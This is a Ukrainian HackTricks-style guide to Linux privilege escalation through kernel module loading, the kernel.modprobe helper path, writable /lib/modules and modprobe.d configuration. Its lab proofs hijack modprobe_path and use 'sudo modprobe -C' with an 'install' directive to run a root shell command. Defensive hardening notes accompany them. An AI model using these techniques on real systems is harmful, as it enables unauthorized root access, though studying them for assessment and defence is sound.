# Зловживання модулями ядра та modprobe

{{#include ../../banners/hacktricks-training.md}}

## Неправильні налаштування модуля ядра та завантаження модулів

Підтримка модулів ядра є важливою сферою під час перевірки Linux на можливість підвищення привілеїв. Не вважайте кожне повідомлення про непідписаний модуль ознакою експлуатації саме по собі, але використовуйте його, щоб отримати відповіді на практичні запитання.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Чи може поточний користувач завантажувати модулі через `sudo`, capabilities або шлях до helper-файлу, доступний для запису?
- Чи все ще увімкнене завантаження модулів?
- Чи вимкнене примусове використання підписів модулів?
- Чи доступні для запису каталоги модулів, файли модулів або шляхи конфігурації `modprobe.d`?<sup>[[16]](#references)</sup>
- Чи можна читати журнали ядра, щоб підтвердити, що сталося?

Швидка первинна перевірка починається з наведених нижче перевірок стану модулів, підписів, журналювання та дерева модулів.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Тлумачення:

- `modules_disabled=1` означає, що модулі не можна ні завантажувати, ні вивантажувати, а значення не можна скинути до `0` до перезавантаження.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` у командному рядку kernel або `CONFIG_MODULE_SIG_FORCE=y` вимагає дійсно підписаних модулів; інакше непідписані модулі можуть завантажитися та позначити kernel як tainted.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` не встановлює жодних обмежень для `dmesg`; коли значення дорівнює `1`, для доступу потрібен `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Доступні для запису шляхи в `/lib/modules/$(uname -r)/` є небезпечними, оскільки `modprobe` під час завантаження модулів шукає в цьому дереві та його даних залежностей.<sup>[[8]](#references)</sup>

### Завантаження модуля та читання виводу kernel

Якщо у вас є законний дозвіл на завантаження локального модуля, `insmod` вставляє саме той файл `.ko`, який ви вказали. Функція init модуля виконується під час завантаження, а повідомлення, записані за допомогою `printk()`, надходять до буфера журналу kernel, який зазвичай читають за допомогою `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Мінімальний процес перевірки використовує `modinfo` для перегляду метаданих, `insmod` і `rmmod` для завантаження та видалення модуля, `lsmod` для підтвердження стану завантаження, а `dmesg` — для перегляду журналів kernel.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Якщо `sudo -l` дозволяє `insmod`, `modprobe` або обгортку над ними, вважайте це критичним: `sudo -l` показує привілеї користувача, який виконує команду, а завантаження kernel module потребує `CAP_SYS_MODULE`. Див. [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) для прямих шляхів на основі capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Дозволений через Sudo `insmod`

Правило sudo, яке дозволяє користувачу запускати `insmod`, не можна порівнювати з дозволом на запуск звичайного адміністративного helper-а. Код ініціалізації модуля виконується під час його вставлення, тому практичне питання під час перевірки полягає в тому, чи може цей користувач вибрати або змінити модуль, який завантажується.<sup>[[3]](#references)</sup>

Наведений нижче загальний процес перевірки повторює перевірки інспекції, завантаження, стану, журналів і видалення для модуля-кандидата.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Якщо користувач може надати довільний `.ko`, під час санкціонованої оцінки це слід розглядати як повну компрометацію системи. Безпечніший операційний підхід — не делегувати завантаження модулів через sudo; якщо це неминуче, обмежте точний шлях, власника, дозволи, політику підписування та процедуру видалення.<sup>[[3]](#references)[[10]](#references)</sup>

Для нешкідливого шаблону створення модуля в контрольованій лабораторії нижче наведено мінімальні вихідний код і Makefile; форма `make -C /lib/modules/$(uname -r)/build M=$PWD` відповідає задокументованому в ядрі робочому процесу kbuild для зовнішніх модулів.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Збирайте та завантажуйте лише в авторизованій лабораторії; kbuild збирає зовнішній модуль, а команди завантаження/видалення викликають інтерфейси kernel module.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Перевірки зловживання `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` визначає userspace helper, який kernel виконує для запитів на автоматичне завантаження модулів; цей sysctl впливає на автоматичне завантаження, а не на явне вставлення модулів. Якщо attacker може змінити його на шлях до executable-файлу, доступного для запису, і викликати запит модуля, цей helper стає привілейованим шляхом виконання коду. Встановлення порожнього рядка вимикає запити на автоматичне завантаження; якщо `CONFIG_STATIC_USERMODEHELPER=y`, непорожнє значення замінюється вбудованим статичним шляхом до helper.<sup>[[1]](#references)</sup>

Перевірте поточний шлях до helper через kernel sysctl interface та перевірте власника й mode цільового файлу.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Перевірте, чи можна вплинути на sysctl, делеговані правила sudo або файлові capabilities.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Наведений нижче шаблон призначений лише для лабораторного використання: він змінює шлях до допоміжної програми та ініціює задокументований запит на автоматичне завантаження модуля; використовуйте його лише в ізольованій системі, на яку маєте дозвіл.<sup>[[1]](#references)</sup>

У сучасних ядрах Linux не використовуйте невідомий виконуваний файл як універсальний тригер: застаріле автоматичне завантаження модуля для власних бінарних форматів було вилучено в Linux 6.14, тоді як документація ядра визначає невідомий тип файлової системи як шлях для запиту на автоматичне завантаження модуля.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
У hardened systems це має завершуватися помилкою, якщо permissions не дозволяють unprivileged запис до `kernel.modprobe`, шлях до helper недоступний для запису або module autoloading вимкнено.<sup>[[1]](#references)</sup>

### Writable `modprobe.d` configuration and `sudo modprobe -C`

Перед resolving module `modprobe` читає `.conf`-файли з configuration directories, таких як `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` і `/lib/modprobe.d`, у порядку пріоритету. Файл із такою самою назвою у directory з вищим пріоритетом затіняє файл у directory з нижчим пріоритетом. Що важливіше, директива `install <module> <command>` запускає довільну shell command **замість** вставлення цього module. Отже, writable configuration path може перетворитися на відкладене виконання command з credentials подальшого privileged `modprobe` caller; kernel module signature enforcement не автентифікує цю userspace command.<sup>[[16]](#references)</sup>

Перевірте permissions directories і файлів, а потім проаналізуйте effective configuration. `modprobe -n -v` безпечно використовувати для перевірки resolution, оскільки dry-run mode не вставляє module і не виконує `install`/`remove` command. Надавайте перевагу `modprobe -c` замість legacy написання `--showconfig`, яке поточна документація kmod позначає як таке, що буде вилучене після kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
[ -e "$d" ] || continue
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
/etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
/usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```
Необмежене правило `sudo` для `modprobe` можна експлуатувати навіть тоді, коли довільні файли `.ko` не проходять перевірку підпису: `-C` вибирає контрольований атакувальником каталог конфігурації, з якого процес, запущений через `sudo`, може виконати команду `install`.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```
Для mitigation не надавайте через sudo `modprobe` без обмежень щодо аргументів, зберігайте всі configuration directories у власності root і без права запису, а також перевіряйте неочікувані директиви `install`/`remove`. Коли довірений адміністративний workflow має обійти такі директиви для одного модуля, `modprobe --ignore-install` ігнорує їх для вказаного модуля, але dependencies усе одно можуть мати власні команди.<sup>[[8]](#references)[[16]](#references)</sup>

### Перевірка доступності для запису `/lib/modules`

Доступні для запису directories модулів можуть уможливити заміну модулів, розміщення malicious modules або зловживання auto-load — залежно від того, як надалі буде викликано `modprobe`; `modprobe` шукає `/lib/modules/$(uname -r)` і використовує його dependency data під час розв'язання модулів.<sup>[[8]](#references)</sup>

Перевірте доступні для запису файли модулів і metadata dependencies/alias у дереві модулів активного kernel release.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Якщо ви знайдете доступний для запису вміст модуля, дослідіть, як `modprobe` визначає залежності та як `modinfo` повідомляє метадані модуля.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Захисні примітки:

- Зберігайте власника `/lib/modules` як `root:root` і забороніть користувачам запис до цього каталогу.<sup>[[8]](#references)</sup>
- Встановлюйте `kernel.modules_disabled=1` після завантаження системи, якщо це можливо з операційної точки зору.<sup>[[1]](#references)</sup>
- Увімкніть обов'язкову перевірку підписів модулів у системах, які потребують модулів, що завантажуються.<sup>[[2]](#references)</sup>
- Відстежуйте записи до `/proc/sys/kernel/modprobe`, `/lib/modules` і каталогів конфігурації `modprobe.d`, а також неочікуване виконання `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## References

- [1] [Документація для /proc/sys/kernel/ — документація Linux Kernel](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Засіб підписування модулів ядра — документація Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — сторінка посібника Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Основи драйверів — документація Linux Kernel](https://docs.kernel.org/driver-api/basics.html)
- [6] [Журналювання повідомлень за допомогою printk — документація Linux Kernel](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Збирання зовнішніх модулів — документація Linux Kernel](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — сторінка посібника Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Тег злиття 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
